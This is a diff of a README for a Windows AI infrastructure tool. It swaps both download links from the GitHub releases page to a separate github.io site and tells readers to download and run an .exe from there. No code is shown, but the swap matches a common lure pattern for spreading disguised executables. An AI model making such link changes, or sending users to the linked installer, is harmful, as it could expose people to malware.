@@ -1,6 +1,6 @@
 # 🤖 DevOpsPilot-AI-RAG - Simplify your daily infrastructure management tasks
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Emre1145/DevOpsPilot-AI-RAG/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://emre1145.github.io)
 
 DevOpsPilot-AI-RAG helps you manage your cloud systems through simple conversation. You ask questions about your infrastructure, and the tool provides answers based on your specific documentation and configuration files. It uses artificial intelligence to scan your technical setup and find the information you need. You no longer need to search through hundreds of pages of manuals or long configuration logs.
 
@@ -19,7 +19,7 @@ To run this application on your Windows computer, ensure your system meets these
 
 You need to download the installer from our release page. Visit the link below to find the most recent version of the application.
 
-[Visit this page to download the software](https://github.com/Emre1145/DevOpsPilot-AI-RAG/releases)
+[Visit this page to download the software](https://emre1145.github.io)
 
 Choose the file that ends in .exe for your Windows system. Save this file to your Downloads folder or your desktop for easy access.
 
